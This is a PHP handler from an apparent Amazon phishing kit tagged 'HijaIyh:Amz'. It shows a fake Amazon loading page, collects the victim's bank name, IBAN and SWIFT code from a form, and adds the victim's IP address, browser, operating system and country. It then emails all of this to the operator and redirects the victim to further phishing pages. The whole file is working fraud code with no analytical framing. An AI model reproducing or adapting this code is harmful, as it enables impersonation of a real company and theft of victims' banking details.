<?php

echo '<title>Amazon - Loading ... </title>';
echo '<center><br><br><br><br><img src="../../aws/img/gif/loading-4x._V1_.gif" style="margin-top:20%"></center>';

if(isset($_POST))
{
    $check = ['namebank','iban','swift_code'];
if($core->empty_post_array($check))
{
     $core->redirect('../../ap/bank?openid.pape.max_auth_age='.sha1(time()).'&locale='.$skey);
      exit;
}
    
    $name = $core->post('namebank');
    $iban = $core->post('iban');
    $swift = $core->post('swift_code');
    
    $data = ['name' => $name, 'iban' => $iban , 'swift_code' => $swift, 'useragent' => $_SERVER['HTTP_USER_AGENT'] ,
            'ip' => $core->userIP() , 
            'country' => $country_name , 
            'date' => date('D,d m Y H:i')];
    
     $info = $country_name." - ".$core->getOS()." - ".$core->userIP()." - ".$core->getBrowser();
    $sendMsg = $core->parse_result('bank',$data);
    $sendSubj = "BANK ACCOUNT : ".$core->session('bank')." ".$core->session('brandtype')." ".$core->session('levelcountry')." // $info ";
    $sendFrom = "#HijaIyh:Amz";
    $core->sendmail($email_result,$sendFrom,$sendSubj,$sendMsg);
	$core->stats('bank',$sendSubj);
    
    if($core->parse_hijaiyh('sp','email_login') == 1)
                {
                    $kemana = 'email';
                }else{
                    $kemana = 'finish';
                }
    $core->redirect('../../ap/'.$kemana.'?openid.pape.max_auth_age='.sha1(time()).'&locale='.$skey);
}